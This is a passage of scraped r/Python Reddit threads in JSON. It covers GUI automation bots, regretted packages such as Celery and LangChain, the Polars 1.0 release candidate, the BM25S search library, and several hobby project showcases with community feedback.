            "content": "https://youtu.be/dZLyfbSQPXI?t=673 There's a link to a conference the guy who made/maintains the library gave on it. The first part is about test automation. The part i skipped to is where he talks about GUI automation. You can use it to make web game bots too, shits pretty cool. Personally I wonder if it can be run with an application running over top of it.",
            "replies": [
                {
                    "author": "SponsoredByMLGMtnDew",
                    "score": "265",
                    "content": "https://youtu.be/dZLyfbSQPXI?t=673 There's a link to a conference the guy who made/maintains the library gave on it. The first part is about test automation. The part i skipped to is where he talks about GUI automation. You can use it to make web game bots too, shits pretty cool. Personally I wonder if it can be run with an application running over top of it.",
                    "replies": [
                        {
                            "author": "POTUS",
                            "score": "193",
                            "content": "if it can be run with an application running over top of it. It hijacks your mouse pointer to do the things that you would normally do with a mouse, so no you can't really multitask all that well. Just run it in a VM and let it do its thing there and it won't interfere with whatever else you want to do.",
                            "replies": [
                                {
                                    "author": "diybrad",
                                    "score": "36",
                                    "content": "Brilliant"
                                },
                                {
                                    "author": "Ree81",
                                    "score": "40",
                                    "content": "You'd think that technology would've come so far that emulating mouse input was done 20 years ago, instead of in 2017, as a hack."
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "",
                            "replies": [
                                {
                                    "author": "SponsoredByMLGMtnDew",
                                    "score": "2",
                                    "content": ""
                                }
                            ]
                        },
                        {
                            "author": "Mattho",
                            "score": "13",
                            "content": "With web you'd probably want to use something that has an idea about the underlying data, such as Selenium. (Assuming this doesn't.)",
                            "replies": [
                                {
                                    "author": "HeWhoWritesCode",
                                    "score": "3",
                                    "content": ""
                                }
                            ]
                        },
                        {
                            "author": "Dgc2002",
                            "score": "10",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "kkjdroid",
            "score": "828",
            "content": "Now you need machine learning to determine the attractiveness of the picture.",
            "replies": [
                {
                    "author": "adrenal8",
                    "score": "311",
                    "content": "Not python, but here’s a project that did that: https://github.com/crockpotveggies/tinderbox"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "481",
            "content": "Note: If you swipe right to all the people, the Tinder algorithm is going to deem you as 'desperate', and therefore, not very attractive. And it's going to lower your ranking so you'll get shown less and less to the most attractive people."
        }
    ]
},
{
    "post_author": "glucoseisasuga",
    "post_id": "1dt95io",
    "post_score": "271",
    "post_time": "Tuesday, July 2, 2024 at 3:54:44 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What are your \"wish I hadn't met you\" packages?",
    "media": [],
    "post_content": "Earlier in the sub, I saw a post about packages or modules that Python users and developers were glad to have used and are now in their toolkit.\nBut how about the opposite? What are packages that you like what it achieves but you struggle with syntactically or in terms of end goal? Maybe other developers on the sub can provide alternatives and suggestions?",
    "comments": [
        {
            "author": "sphen_lee",
            "score": "249",
            "content": "Celery A lot of code and a lot of behind the scenes magic. Abstracts away from the message broker which makes it really hard to use the broker's own observability and monitoring tooling. Wish I had directly used RabbitMQ with pika.",
            "replies": [
                {
                    "author": "pirsab",
                    "score": "51",
                    "content": "I was about to learn this the hard way.",
                    "replies": [
                        {
                            "author": "CrossroadsDem0n",
                            "score": "1",
                            "content": "Pika has its own oddities but mostly just a learning curve of \"oh, I see, RabbitMQ does that\". Probably the weirdest is that in scaling you really don't seem to have a robust way to stop one listener from being greedy with sucking up more messages than you expected. You can mitigate the problem, but it isn't like other queue APIs where you can more directly control that behavior. Mostly a pain when dealing with small messages that have big processing requirements. You think you are dealing with one message at a time, but behind the scenes the others in the buffer time out with RabbitMQ waiting for their ack, causing them to be redelivered elsewhere... but the current client gets them too."
                        },
                        {
                            "author": "startup_biz_36",
                            "score": "1",
                            "content": "Same I was looking into this but from my research it’s a headache 😂"
                        }
                    ]
                }
            ]
        },
        {
            "author": "siowy",
            "score": "105",
            "content": "Pysimplegui. They started as probably the most user friendly GUI framework, and then they went subscription model out of nowhere.",
            "replies": [
                {
                    "author": "PurepointDog",
                    "score": "29",
                    "content": "Yeah this is the one. It's not even that good."
                },
                {
                    "author": "phlooo",
                    "score": "25",
                    "content": ""
                }
            ]
        },
        {
            "author": "serjester4",
            "score": "264",
            "content": "Llangchain. A garbage heap of a codebase that makes you jump through 5 abstractions to do the simplest thing. They litterly created a class for prompts that’s a wrapper on an f-string.",
            "replies": [
                {
                    "author": "wergot",
                    "score": "31",
                    "content": "Starting to feel this way about llamaindex as well. I can do chunking and hit the embeddings API just fine and get exactly the behavior I actually want without wading through their shit Also all the hype new vector databases like chroma seem kinda useless. There are extensions to postgres to get vector types, distance and cosine angle."
                }
            ]
        },
        {
            "author": "portalfan267",
            "score": "63",
            "content": "Serial, not pyserial, Serial."
        },
        {
            "author": "PurepointDog",
            "score": "40",
            "content": "Streamlit. NiceGUI or Dash are far nicer to work with, and support \"normal\" programming (instead of the \"full re-execution on load\" thing that Streamlit does). I didn't find out about them though bc Streamlit was \"good enough\""
        },
        {
            "author": "EternityForest",
            "score": "36",
            "content": "GStreamer is the big one. I love it. There's basically nothing like it.  But when it goes wrong it can be hard to debug, and sometimes you have to do hacky nonsense to make it do what you want. Like, my app detects what virtualenv it's running from, and adds a symlink to the global package, because you cannot install it with Pip, and system-site-packages is not ideal."
        }
    ]
},
{
    "post_author": "young-and-ignorant",
    "post_id": "1ds3xlk",
    "post_score": "3",
    "post_time": "Sunday, June 30, 2024 at 6:22:54 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Building AI tools should be simple",
    "media": [
        "https://github.com/ion2088/firedust"
    ],
    "post_content": "A few months ago, I was experimenting with AI tools for information retrieval and found the process needlessly complex. Managing RAGs, vector databases, inference services, and multiple API keys among other things. I just wanted to iterate on a few ideas without getting bogged down by all these details that should \"just work\".\nThat's why I started working on Firedust. It abstracts away these complexities, minimizing the time from concept to product. Unlike OpenAI's Assistants API, Firedust simplifies the development process and doesn't tie you to a single LLM. You can easily switch between models without downtime. It also allows deployment to Slack, supports group chats, and has data encryption and user privacy built-in.\nI’d love to hear your thoughts and feedback!\nSource code: https://github.com/ion2088/firedust\nTarget audience: Developers that want to quickly iterate and deploy AI tools",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "bsenftner",
            "score": "40",
            "content": "Looks very comprehensive, which leads one to look at you, your github account to learn more about who made this. I find two repos, both for this project, and very little activity until 1 year ago. To feel confident I'm not wasting my time, I need to know more about who made this, their background. Yes, I'm being suspicious; far too many bad players these days.",
            "replies": [
                {
                    "author": "micseydel",
                    "score": "11",
                    "content": "When I see something like this needs an access key (for Firedust, not just OpenAI), it's almost an instant no for me.",
                    "replies": [
                        {
                            "author": "young-and-ignorant",
                            "score": "0",
                            "content": "It's a tool that controls a lot of expensive resources. It's essential to have keys for access.",
                            "replies": [
                                {
                                    "author": "micseydel",
                                    "score": "1",
                                    "content": "Just reiterating that services like yours are not tools - tools empower people, services trap people. There are plenty of tools around, no need to rely on sketchy services."
                                },
                                {
                                    "author": "micseydel",
                                    "score": "1",
                                    "content": "Bad faith replies like yours right here are exactly why I don't trust stuff like this. Instead of being honest, you're playing games."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "SekretSandals",
                    "score": "4",
                    "content": "I’m pretty new to Python so I’m a little confused here. What should somebody be suspicious of? Do people put viruses in code? Or do you think it’s meant to steal information? I understand it’s rare to find a rather empty GitHub account and seemingly well put together project but maybe they just haven’t shared their other projects? I make a lot of Python scripts but I’ve never posted one because I don’t see why anyone would want to use them."
                },
                {
                    "author": "Nixellion",
                    "score": "2",
                    "content": "Does not look THAT comprehensive tbh. On first glance. But I may need to take another look. What did you find comprehensive about it?"
                },
                {
                    "author": "young-and-ignorant",
                    "score": "0",
                    "content": "There is not that much interesting to learn about me, so I hoped to let my work do the talking. To add some peace of mind I updated my github with personal info ( https://github.com/ion2088). My background is in quant development in hedge funds, where the tech is good but people are pretty anxious about their IP. Besides, I think firedust is the first thing that I built purely for fun and I'm happy to share with others. Yet, I would encourage to ignore all that, look at the code and just try it out. I will send you an access key in the DM. Would be great to know your thoughts."
                }
            ]
        },
        {
            "author": "_Joab_",
            "score": "16",
            "content": "That's amazing! But, who are you? Did you build this yourself or are you part of a team? Seems incredibly well developed for a side project by one person. Edit: After looking through the code, the amount of logic happening behind the proprietary firedust REST API is worrying. I get that you implemented cool stuff that you don't want to share because it might be valuable, but maybe add a flag to use regular API endpoints (openai, openrouter.ai, together.ai, whatever) and raise NotImplementedError for stuff that requires your secret algorithm? I can't send my data to your API without knowing what's happening to it, or infact, at all. And you built many convenience methods that don't require your specific REST API, it's really a shame."
        },
        {
            "author": "SpareIntroduction721",
            "score": "4",
            "content": ""
        },
        {
            "author": "teerre",
            "score": "4",
            "content": "Always funny to have this obsession with everything being simple. Specially funny when it comes to LLMs, which is not even understood theoretically and barely understood in terms of engineering. Why the hell would it be simple? It's extremely complicated!",
            "replies": [
                {
                    "author": "Healthy-Bonus-6755",
                    "score": "3",
                    "content": "It's honestly quite disheartning and sad as someone who actively worked in computational linguistics to see people getting praised for wrapper projects like this. What even is this? it's an API to other peoples work. Like you said, this stuff is not easy and requires a degree or masters degree to understand. Instead of this, it would be much more exciting if OP implemented some simple LLM architecture and trained it up, doesn't even need to work well."
                }
            ]
        },
        {
            "author": "SpeechAggravating552",
            "score": "2",
            "content": "thats cool. you should list it on ai-powered.com"
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1dmmqmn",
    "post_score": "144",
    "post_time": "Sunday, June 23, 2024 at 4:57:45 PM GMT+3",
    "flair_text": "News",
    "post_title": "Python Polars 1.0.0-rc.1 released",
    "media": [
        "https://arrow.apache.org/",
        "https://docs.pola.rs/releases/upgrade/1/",
        "https://github.com/pola-rs/polars/releases/tag/py-1.0.0-rc.1",
        "https://github.com/pola-rs/polars/releases/tag/py-1.0.0-beta.1"
    ],
    "post_content": "After the 1.0.0-beta.1 last week the first (and possibly only) release candidate of Python Polars was tagged.\n1.0.0-rc.1 release page: https://github.com/pola-rs/polars/releases/tag/py-1.0.0-rc.1\nMigration guide: https://docs.pola.rs/releases/upgrade/1/\nAbout Polars\nPolars is a blazingly fast DataFrame library for manipulating structured data. The core is written in Rust, and available for Python, R and NodeJS.\nKey features\nFast: Written from scratch in Rust, designed close to the machine and without external dependencies.\nI/O: First class support for all common data storage layers: local, cloud storage & databases.\nIntuitive API: Write your queries the way they were intended. Polars, internally, will determine the most efficient way to execute using its query optimizer.\nOut of Core: The streaming API allows you to process your results without requiring all your data to be in memory at the same time\nParallel: Utilises the power of your machine by dividing the workload among the available CPU cores without any additional configuration.\nVectorized Query Engine: Using Apache Arrow, a columnar data format, to process your queries in a vectorized manner and SIMD to optimize CPU usage.",
    "comments": [
        {
            "author": "pan0ramic",
            "score": "15",
            "content": "I just made the switch and love it. Pandas feels really outdated Especially if you write pyspark, it was so easy to transition"
        },
        {
            "author": "poppy_92",
            "score": "81",
            "content": "Do we honestly need a new post for every beta, rc, alpha release?",
            "replies": [
                {
                    "author": "marcogorelli",
                    "score": "9",
                    "content": "I made a post last week about the first pre-release, now someone else (not me) has made a post about this one. Presumably someone else will make another post next week, and then someone else when 1.0 actually comes out - I understand that, on aggregate, this can be annoying to the rest of the community What this suggests to me is that perhaps there's enough interest for a Polars subreddit?"
                },
                {
                    "author": "iAmNotorious",
                    "score": "11",
                    "content": "I can't believe you aren't downvoted into oblivion. The polars crowd is in a frenzy these days. I'm starting to think the publicity is being paid for because it is just so overwhelming.",
                    "replies": [
                        {
                            "author": "ritchie46",
                            "score": "33",
                            "content": ""
                        },
                        {
                            "author": "poppy_92",
                            "score": "16",
                            "content": ""
                        },
                        {
                            "author": "DERBY_OWNERS_CLUB",
                            "score": "3",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "Equivalent-Way3",
                    "score": "19",
                    "content": "",
                    "replies": [
                        {
                            "author": "poppy_92",
                            "score": "62",
                            "content": ""
                        },
                        {
                            "author": "zurtex",
                            "score": "9",
                            "content": ""
                        },
                        {
                            "author": "yrubooingmeimryte",
                            "score": "7",
                            "content": ""
                        },
                        {
                            "author": "j_tb",
                            "score": "1",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "tangent100",
            "score": "10",
            "content": "It is very exciting for anyone who doesn't respect precision data types. They should wait until they actually have Decimal working."
        },
        {
            "author": "magnetichira",
            "score": "15",
            "content": "Sticking to pandas, existing codebases use it and it just works. Also a new post for a beta.1 release? lol",
            "replies": [
                {
                    "author": "XtremeGoose",
                    "score": "18",
                    "content": "It doesn't \"just work\". It has a million gotchas, the learning curve is brutal, the syntax and type system are an inconsistent mess and it's slow as fuck. Polars is just a better tool, and I say that as someone who has used pandas for 10 years."
                },
                {
                    "author": "DuckDatum",
                    "score": "7",
                    "content": "Polars is great. For the most part I use pandas in production, but polars for EDA and ad-hoc analyses. I’ve also just went straight to polars for certain features like reading in multiple CSV files as one DataFrame (didn’t need to build something to glob the directory, check the files, read each as a DataFrame, and concatenate the results). Recently I put one ETL pipeline in production with polars. It’s been doing great at its job for about a month now. I know to be careful of breaking changes at the moment, but so far so good. There are lots of good reasons to use it over pandas, but one good consideration is that people who are just learning Python now are faced with learning Polars and/or Pandas. Each day now, Polars is looking more like the better option for them to prioritize unless they care about maintaining legacy codebases. It’s easy to see how newer codebases would introduce this technology, and we may be better off for embracing it early."
                }
            ]
        },
        {
            "author": "NewspaperPossible210",
            "score": "3",
            "content": "My data and lack of skill (I’m a scientist, not a data scientist) is hitting a wall with pandas, where my data is >100M rows with columns involving a variety of data types, including 1024 bit vectors (this is for chemistry applications). Is polars for me or should I be learning something like SQL?"
        },
        {
            "author": "damesca",
            "score": "6",
            "content": "Is there a(n easy) way to pass a dataframe from python to rust? I have a large dataframe I want to export to excel; in python it's v slow and I'm wondering if it's faster to export on the rust side?",
            "replies": [
                {
                    "author": "th0ma5w",
                    "score": "8",
                    "content": "Arrow? Maybe?"
                }
            ]
        }
    ]
},
{
    "post_author": "xhlu",
    "post_id": "1dmwfbf",
    "post_score": "32",
    "post_time": "Monday, June 24, 2024 at 12:12:45 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "BM25 for Python: Achieving high performance while simplifying dependencies with BM25S",
    "media": [
        "https://bm25s.github.io/assets/comparison.png",
        "https://github.com/xhluca/bm25s",
        "https://huggingface.co/blog/xhluca/bm25s"
    ],
    "post_content": "Hello fellow Python enthusiasts :)\nI wanted to share bm25s, a new lexical search library that fully implemented in Python (via numpy and scipy) and is quite fast.\nBlog Post\nGitHub Repository\nHere is a comparison of BM25S and Elasticsearch in a single-threaded setting (calculated on popular datasets from the BEIR benchmark): https://bm25s.github.io/assets/comparison.png\nIt was designed to improve upon existing Python implementations, such as the widely used rank-bm25 by being significantly faster; all while being very straightforward to use in Python.\nAfter installing with pip install bm25s, here's the code you'd need to get started:\nimport bm25s\n\n# Create your corpus here\ncorpus = [\n    \"a cat is a feline and likes to purr\",\n    \"a dog is the human's best friend and loves to play\",\n    \"a bird is a beautiful animal that can fly\",\n    \"a fish is a creature that lives in water and swims\",\n]\n\n# Create the BM25 model and index the corpus\nretriever = bm25s.BM25(corpus=corpus)\nretriever.index(bm25s.tokenize(corpus))\n\n# Query the corpus and get top-k results\nquery = \"does the fish purr like a cat?\"\nresults, scores = retriever.retrieve(bm25s.tokenize(query), k=2)\n\n# Let's see what we got!\ndoc, score = results[0, 0], scores[0, 0]\nprint(f\"(score: {score:.2f}): {doc}\")\nI'm making this tool for folks who want to have a Python-only experience; fans of Java already have access to many libraries!\nAnyways, the blog post covers most of the background around lexical search libraries and why BM25S was built, I mainly wanted to make this post to answer questions you might have about how to use it (or anything else)!",
    "comments": [
        {
            "author": "RepresentativeFill26",
            "score": "7",
            "content": "",
            "replies": [
                {
                    "author": "xhlu",
                    "score": "6",
                    "content": ""
                }
            ]
        },
        {
            "author": "busybody124",
            "score": "1",
            "content": "",
            "replies": [
                {
                    "author": "xhlu",
                    "score": "2",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "paulkaefer",
    "post_id": "irh8l0",
    "post_score": "6503",
    "post_time": "Saturday, September 12, 2020 at 8:53:16 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I'm excited to share my first published book, Introduction to Python Programming for Business and Social Science Applications -- specifically geared towards students not specifically in computer science",
    "media": [
        "https://i.redd.it/ebmh8z3c8rm51.png",
        "https://preview.redd.it/ebmh8z3c8rm51.png?width=640&crop=smart&auto=webp&s=d730420b18e804ad27e429097915af6ea13db3fa"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "nicolaizoffmann",
            "score": "107",
            "content": "",
            "replies": [
                {
                    "author": "paulkaefer",
                    "score": "72",
                    "content": ""
                }
            ]
        },
        {
            "author": "paulkaefer",
            "score": "299",
            "content": "",
            "replies": [
                {
                    "author": "sgtavers",
                    "score": "63",
                    "content": ""
                }
            ]
        },
        {
            "author": "DontTellBossIReddit",
            "score": "41",
            "content": "Way to go! I didn't even know John Oliver knew how to program."
        }
    ]
},
{
    "post_author": "Specialist-Arachnid6",
    "post_id": "1do46ez",
    "post_score": "53",
    "post_time": "Tuesday, June 25, 2024 at 2:55:32 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Modern Notepad using PyQt6 [UPDATE] | ZenNotes",
    "media": [
        "https://github.com/rohankishore/ZenNotes",
        "https://www.reddit.com/r/Python/comments/1772bst/i_made_a_notepad_alternative_using_pyside6/",
        "https://fluent2.microsoft.design/"
    ],
    "post_content": "What does my Project do?\nZenNotes is a minimalistic Notepad app with a sleek design inspired by Fluent Design. It offers the familiar look of the Windows Notepad while having much more powerful features like Translate, TTS, etc.\nText to Speech\nMarkdown support\nTranslation\nGet Wikipedia Articles\nAnd much more.\nTarget Audience\nPeople who want a better but similar experience and look as that of Windows Notepad\nComparison\nUnlike Windows Notepad, it has support for Markdown, TTS, etc\nMoreover, it has a great UI.\nUpdate\nThis is an update post to this\nGitHub\nGitHub Link: https://github.com/rohankishore/ZenNotes",
    "comments": [
        {
            "author": "AbbreviationsSuch988",
            "score": "41",
            "content": "First of all good job, it is a nice application and project. Having said that sometimes you don't follow naming conventions, in particular on module names and it is discoraged to use wildcard imports due to namespace pollution. Also, usually there should be a file for each class, for code organization, but this is of secondary importance. More importantly, you could use a pyproject.toml file, both to configure a linter and formatter, that are useful, but more importantly for packaging your application, to distribute it on PyPI for example, and to have a nice integration with test environments.",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "17",
                    "content": "Thanks a lot for your kind words and feedbacks. I'll note it and make the project better. Once again, thanks a lot 😊"
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "4",
            "content": "What makes this more modern than other text editors?",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "1",
                    "content": "This is more of a Notepad replacement. What makes it \"modern\" is the addition of TTS, translation, wikipedia api, etc, which the Windows Notepad lacks."
                }
            ]
        },
        {
            "author": "Nil4u",
            "score": "1",
            "content": "Is there a benefit to passing functions to `.connect()` via a lambda instead of just passing the function directly?",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "1",
                    "content": "For some weird reason passing the function directly didn't worked properly. And also, in some cases where I want to pass arguments to a function, you can't do that directly inside connect without using lambda. Hope I made sense 😄"
                }
            ]
        },
        {
            "author": "Inevitable-Glove7011",
            "score": "1",
            "content": "Just used the editor a little bit and overall it leaves a good sense! Congrats for your work. Some notes : It would be nice to be able to right click a tab and have some options here , for sure one should be an option to rename the file Encryption / Decryption should be renamed to encoding / decoding since as far as I can see it is encodes the text as a base64 string. Also the option to decrypt the whole file should be availbale without having to select all content of the file. The summary from Wikipedia works at some selections and not in others. When it is not available I see always the message that Wikipedia is not available at the moment but I don't think it is due to a network problem rather than the Wikipedia Api dont find something relevant. It would be nice to return the user the proper message",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "1",
                    "content": "Noted! And thanks for your kind words 😊"
                }
            ]
        },
        {
            "author": "Yodahacks0161",
            "score": "0",
            "content": "This is highly recommended. Great tool right there I really love this and can't wait to write an article about.",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "1",
                    "content": "OMG thanks a lot 😊🙏🏻 I'd happily feature it in my GitHub too :) also share the link here whenever you publish it. Once again, thanks a lot ☺️"
                }
            ]
        }
    ]
},
{
    "post_author": "yogeshkd",
    "post_id": "1dttjsb",
    "post_score": "7",
    "post_time": "Tuesday, July 2, 2024 at 9:51:54 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "python-fiddle.com: a website to write, run, and share python code and data visualizations",
    "media": [
        "https://python-fiddle.com/"
    ],
    "post_content": "There are several of these online Python code editors but they don't have additional packages like matplotlib etc so I made https://python-fiddle.com. It is based on pyodide so the Python code runs in the browser and it can load any necessary packages automatically by inspecting the code. The code editor is similar to a Jupyter notebook so you can share both the code and output together as a link.",
    "comments": [
        {
            "author": "yrubooingmeimryte",
            "score": "1",
            "content": "You should probably disclose whether or not this is something you made (and therefore your recommendation is self-serving and biased) or whether you're a disinterested third party.",
            "replies": [
                {
                    "author": "yogeshkd",
                    "score": "1",
                    "content": "👍 updated to indicate that I made it"
                }
            ]
        }
    ]
},
{
    "post_author": "Specialist-Arachnid6",
    "post_id": "1dmsfjx",
    "post_score": "46",
    "post_time": "Sunday, June 23, 2024 at 9:14:36 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Modern YouTube Downloader using PyQt6 [UPDATE] | Youtility",
    "media": [
        "https://www.reddit.com/r/Python/comments/1b66726/i_made_a_youtube_downloader_with_modern_ui_pyqt6/",
        "https://github.com/rohankishore/Youtility"
    ],
    "post_content": "What does my Project do?\nYoutility helps you to download YouTube content locally. With Youtility, you can download:\nSingle videos with captions file\nPlaylists (also as audio-only files)\nVideo to Mp3\nCut and download parts of videos\nIndividual caption files (XML / SRT) from videos\nTarget Audience\nPeople who want to save YouTube playlists/videos locally who don't wanna use command line tools like PyTube or YT-DLP.\nComparison\nUnlike existing alternatives, Youtility helps you to download:\nentire playlist as audio files.\nXML/SRT captions\nConvert existing XML captions to SRT\nSpecific parts of videos\nAnd moreover, it has a great UI.\nUpdate\nThis is an update post to this\nGitHub\nGitHub Link: https://github.com/rohankishore/Youtility",
    "comments": [
        {
            "author": "Specialist-Arachnid6",
            "score": "9",
            "content": "So, what's changes since the last time? New UI Option to cut and download specific parts from a video Option to export audios to FLAC (for both videos and playlists) (edit)",
            "replies": [
                {
                    "author": "abhie_lp",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "psicodelico6",
            "score": "2",
            "content": "",
            "replies": [
                {
                    "author": "psicodelico6",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "RickStrive",
            "score": "1",
            "content": "Are there any modded YouTube mobile apps or third-party apps that allow you to store videos within the app rather than in the gallery? Additionally, can these apps download subtitles along with the video, enable you to easily turn subtitles on or off, and let you delete the videos conveniently? I'm looking for a modded or third-party YouTube downloader that offers the same convenience as YouTube Premium.",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "1",
                    "content": "YTDLnis is there. Although I doubt if it covers all your criterias. Give it a try ig"
                }
            ]
        },
        {
            "author": "Jump_And_Shout",
            "score": "1",
            "content": "Can you output the audio to .FLAC?",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "8",
                    "content": "Update: I've implemented it! It only works for Videos and not Playlists as of now, but I'll take a look at it too. Thanks :)"
                },
                {
                    "author": "Specialist-Arachnid6",
                    "score": "4",
                    "content": "Nope. Now that you said it, I'll add an option to choose mp3, webm, or flac. Thanks."
                },
                {
                    "author": "Zestyclose_Car1088",
                    "score": "6",
                    "content": "Why? You gain nothing but extra file size..."
                }
            ]
        }
    ]
},
{
    "post_author": "falko-s",
    "post_id": "1drczng",
    "post_score": "37",
    "post_time": "Saturday, June 29, 2024 at 5:55:20 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Sonos Moments - A simple web app to control Sonos speakers",
    "media": [
        "https://github.com/falkoschindler/sonos_moments",
        "https://nicegui.io/",
        "https://play.google.com/store/apps/details?id=com.sonos.acr2"
    ],
    "post_content": "I finally open-sourced my tiny side-project where I implemented a web app for controlling Sonos speakers, especially switching between pre-defined \"moments\".\nLink: Sonos Moments\nAfter the latest update of the official Sonos app for Android with an average rating of 1.2 stars, I needed an alternative solution for common tasks like changing the volume or pausing/unpausing the music. And starting my morning routine with a single click is not possible at all with the official app. Apart from that it is a great opportunity to use NiceGUI for rapidly solving a real-world problem at hand.\nWhat My Project Does\nProvide a simple web UI for controlling Sonos speakers in a local network.\nAllow capturing and managing the state of multiple speakers (\"moments\") and restoring them with a single click.\nAllow to quickly play/pause speakers and control their volume without opening the official mobile app.\nTarget Audience\nPython developers and smart home enthusiasts in need for a better Sonos app.\nComparison\nAs far as I'm aware, there is no other open-source web UI for Sonos speakers.",
    "comments": [
        {
            "author": "Eyedema",
            "score": "7",
            "content": "it would be cool to be able to group multiple speakers together through the app. nice work!"
        },
        {
            "author": "SheriffRoscoe",
            "score": "3",
            "content": "Gonna check this out. Thanks!"
        },
        {
            "author": "djlarrikin",
            "score": "2",
            "content": "Would it be possible to implement skip ahead and back by a certain amount of seconds. The new app makes listening to audiobooks annoying and podcasts, with commercials, unbearable",
            "replies": [
                {
                    "author": "falko-s",
                    "score": "2",
                    "content": "Great idea! I just started experimenting with such a skip ahead feature: https://github.com/falkoschindler/sonos_moments/pull/3"
                }
            ]
        },
        {
            "author": "tdawgs1983",
            "score": "2",
            "content": "Much needed, Sonos has completely destroyed their own app. Clunky, slow and non responsive."
        }
    ]
},
{
    "post_author": "ChoiceUpset5548",
    "post_id": "1do9t4w",
    "post_score": "22",
    "post_time": "Tuesday, June 25, 2024 at 7:12:15 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I built a free application for effortless video transcription and translation",
    "media": [
        "https://github.com/lkmeta/txtify",
        "https://txtify-web.vercel.app/"
    ],
    "post_content": "I built Txtify – a free, open-source web application that translates audio and video to text using AI models.\nWhat My Project Does:\nTxtify is a web application designed to convert audio and video files into text using AI models. The application uses FastAPI, DeepL, and Hugging Face models, with a special focus on Whisper due to its impressive accuracy. Users can transcribe and translate audio and video in over 30 languages, and output the results in multiple formats such as .txt, .pdf, .srt, .vtt, and .sbv.\nTarget Audience:\nusers (translators, transcriptionists...)\ndevelopers\ncontent creators\nresearchers etc.\nComparison:\nhigh-accuracy transcriptions using Whisper\nsupports multiple languages\nvarious output formats\nopen-source and self-hostable (so you don't have to pay)\nrun it on your browser and use the model that fits better on your device\nCheck it out on GitHub: https://github.com/lkmeta/txtify\nHope you enjoy it! Would love to hear your opinions about this.",
    "comments": [
        {
            "author": "martinky24",
            "score": "3",
            "content": "Use pathlib",
            "replies": [
                {
                    "author": "ChoiceUpset5548",
                    "score": "1",
                    "content": "Thanks for the suggestion! I'll look into using pathlib and update the project."
                }
            ]
        },
        {
            "author": "mrswats",
            "score": "1",
            "content": "No tests. Weird way to deploy, imo. You should avoid doing path shenanigans for an application.",
            "replies": [
                {
                    "author": "ChoiceUpset5548",
                    "score": "1",
                    "content": "Thank you for your feedback! You're right; tests are crucial. I'm planning to add tests asap. Could you elaborate on the deployment concerns? I'm always looking to improve and would love to hear your suggestions."
                }
            ]
        }
    ]
},
{
    "post_author": "I_will_delete_myself",
    "post_id": "1dtnr96",
    "post_score": "10",
    "post_time": "Tuesday, July 2, 2024 at 5:52:50 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Would you say Piccolo ORM is production ready in 2024?",
    "media": [],
    "post_content": "I have to build a backend in python and want to try something new. I was thinking of trying Piccolo for prototyping the DB since it looks simpler than SQLAlchemy (although SQLAlchemy is more proven) and either keeping it or converting the code into sql statements before production.\nHowever, would you say Piccolo ORM is production ready in 2024 beyond hobby projects or prototyping? Maintainer is still updating the repo so the commitment is impressive and its seems simple with async out of the box.",
    "comments": [
        {
            "author": "shinitakunai",
            "score": "5",
            "content": "To this day I still love peewee, what does piccolo offers over it?",
            "replies": [
                {
                    "author": "I_will_delete_myself",
                    "score": "2",
                    "content": "It just has appealing features for me like a admin, baked in migrations available, etc..."
                },
                {
                    "author": "Usual-Instruction-70",
                    "score": "3",
                    "content": "I love peewee. But I need a real migration engine."
                }
            ]
        },
        {
            "author": "dAnjou",
            "score": "5",
            "content": "Define \"production ready\" please :)",
            "replies": [
                {
                    "author": "I_will_delete_myself",
                    "score": "5",
                    "content": "Something you would feel comfortable with your company running for their business without needing to worry about breaking bugs."
                }
            ]
        },
        {
            "author": "Ra1nb0wM0nk3y",
            "score": "2",
            "content": "It already has a solid feature set, regular updates and a really nice admin interface. Unless you're using a production database that is not Postgres or CockroachDB."
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Sure, but is Piccolo ORM production ready?",
            "replies": [
                {
                    "author": "yrubooingmeimryte",
                    "score": "4",
                    "content": "Sure, but is Piccolo ORM production ready?"
                },
                {
                    "author": "I_will_delete_myself",
                    "score": "3",
                    "content": "That was the plan though. First prototype all the database stuff using an ORM. Then because I done a DAL for production I can use normal postgres. I am just curious if Piccolo is production ready so I can increase speed to market."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dmzzup",
    "post_score": "13",
    "post_time": "Monday, June 24, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "InterestingBig5702",
            "score": "-2",
            "content": "Who will help me with the chatbot?"
        }
    ]
},
{
    "post_author": "Itwist101",
    "post_id": "gn9add",
    "post_score": "5722",
    "post_time": "Wednesday, May 20, 2020 at 1:58:14 PM GMT+3",
    "flair_text": "I Made This",
